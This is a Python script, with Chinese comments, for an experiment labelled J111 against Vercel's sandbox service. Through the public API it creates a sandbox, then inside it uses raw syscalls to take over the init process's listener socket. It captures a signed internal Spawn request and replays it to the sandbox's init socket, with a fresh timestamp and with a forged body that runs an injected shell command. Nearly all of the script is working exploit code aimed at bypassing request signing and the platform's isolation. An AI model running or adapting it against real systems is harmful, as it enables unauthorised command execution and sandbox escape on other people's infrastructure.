# 实验J111: 捕获合法签名请求后重放矩阵 — 签名是否绑定 timestamp/body (同沙箱内)
import json, time, urllib.request, urllib.error, sys, base64, threading
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj111"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, select, ctypes, time, threading, socket, struct, base64

libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
def sc(nr, *args):
    ctypes.set_errno(0)
    r = libc.syscall(nr, *args)
    return r, ctypes.get_errno()

cap = {"raw": None, "body": None}
stop = threading.Event()

def accept_loop():
    pfd, e = sc(434, 1, 0)
    if pfd < 0:
        print("pidfd_open fail", flush=True)
        return
    lid, e2 = sc(438, pfd, 4, 0)
    if lid < 0:
        print("listener dup fail", e2, flush=True)
        return
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM, fileno=lid)
    s.settimeout(0.3)
    while not stop.is_set():
        try:
            conn, _ = s.accept()
            conn.settimeout(2)
            chunks = []
            while True:
                try:
                    d = conn.recv(65536)
                    if not d:
                        break
                    chunks.append(d)
                except (socket.timeout, OSError):
                    break
            raw = b"".join(chunks)
            if raw and cap["raw"] is None:
                cap["raw"] = raw
                print("CAPTURED %d bytes" % len(raw), flush=True)
            try:
                conn.close()
            except OSError:
                pass
        except socket.timeout:
            continue
        except OSError:
            break

threading.Thread(target=accept_loop, daemon=True).start()
print("READY_WAIT_CAPTURE", flush=True)
deadline = time.time() + 40
while time.time() < deadline and cap["raw"] is None:
    time.sleep(0.5)
stop.set()
if cap["raw"] is None:
    print("NO_CAPTURE", flush=True)
else:
    raw = cap["raw"]
    head, _, rest = raw.partition(b"\r\n\r\n")
    # 分离 header 与 body: body 前可能有 chunked 帧,直接取 rest 原始
    body = rest
    sig = ts = None
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"x-signature:"):
            sig = line.split(b":", 1)[1].strip().decode()
        if line.lower().startswith(b"x-timestamp:"):
            ts = line.split(b":", 1)[1].strip().decode()
    print("sig=%s" % sig, flush=True)
    print("ts=%s" % ts, flush=True)
    print("bodyhex=%s" % body.hex(), flush=True)

    # 保存样本
    open("/tmp/cap_sample.txt", "w").write("%s\n%s\n%s" % (sig, ts, body.hex()))

    def raw_req(reqbytes, label, timeout=6):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.connect("/run/vercel/share/init.sock")
            s.sendall(reqbytes)
            s.settimeout(timeout)
            data = b""
            while True:
                d = s.recv(65536)
                if not d:
                    break
                data += d
            s.close()
            print("--- %s: %r" % (label, data[:300]), flush=True)
            return data
        except Exception as ex:
            print("--- %s EXC %r" % (label, ex), flush=True)
            return b""

    def make_req(sig_h, ts_h, body_b):
        cl = len(body_b)
        req = (
            "POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "User-Agent: connect-go/1.18.1 (go1.26.6)\r\n"
            "Content-Length: %d\r\n"
            "Accept-Encoding: identity\r\n"
            "Connect-Accept-Encoding: gzip\r\n"
            "Connect-Protocol-Version: 1\r\n"
            "Content-Type: application/connect+proto\r\n"
            "X-Signature: %s\r\n"
            "X-Timestamp: %s\r\n"
            "\r\n" % (cl, sig_h, ts_h)
        ).encode() + body_b
        return req

    # 构造新 body: python3 -c 'os.system("echo J111PWN > /tmp/j111pwn.txt")'
    code = "import os;os.system('echo J111PWN > /tmp/j111pwn.txt')"
    def pb_field(f, s):
        b = s.encode()
        return bytes([f]) + bytes([len(b)]) + b
    new_pb = pb_field(0x0a, "python3") + pb_field(0x12, "-c") + pb_field(0x12, code) + pb_field(0x22, "/vercel/sandbox")
    new_body = b"\x00" + struct.pack(">I", len(new_pb)) + new_pb
    print("new_body len=%d hex=%s" % (len(new_body), new_body.hex()), flush=True)

    now = str(int(time.time()))
    # T1 原样重放
    raw_req(make_req(sig, ts, body), "T1-replay-asis (SIG+TS+body orig)", 8)
    # T2 只改 TS
    raw_req(make_req(sig, now, body), "T2-ts-now (SIG orig, TS now, body orig)", 8)
    # T3 改 body + TS now
    raw_req(make_req(sig, now, new_body), "T3-body-pwn (SIG orig, TS now, body NEW)", 8)
    # T4 随机签名对照
    raw_req(make_req(base64.b64encode(b"\x99" * 64).decode(), now, new_body), "T4-random-sig (control)", 8)
    # T5 原样 body + TS now + 原 SIG (body orig)
    raw_req(make_req(sig, now, body), "T2-dup", 4)
    # 检查执行效果
    try:
        print("file check:", open("/tmp/j111pwn.txt").read(), flush=True)
    except Exception as ex:
        print("file check: MISSING", flush=True)
    print("REPLAY_DONE", flush=True)
"""
print(">> 启动沙箱内捕获+重放(60s), 本地触发 cmd", flush=True)

def trigger():
    for i in range(10):
        try:
            body = {"command": "echo", "args": ["trig-%d" % i], "wait": True, "logs": True, "timeout": 100}
            c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
            print(f"  trigger[{i}] -> {c}", flush=True)
        except Exception as ex:
            print(f"  trigger[{i}] EXC {ex}", flush=True)
        time.sleep(2)

th = threading.Thread(target=trigger, daemon=True)
th.start()
run_cmd(sid, PROBE, "capture-replay", wait=True, timeout=300000)
th.join(timeout=1)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
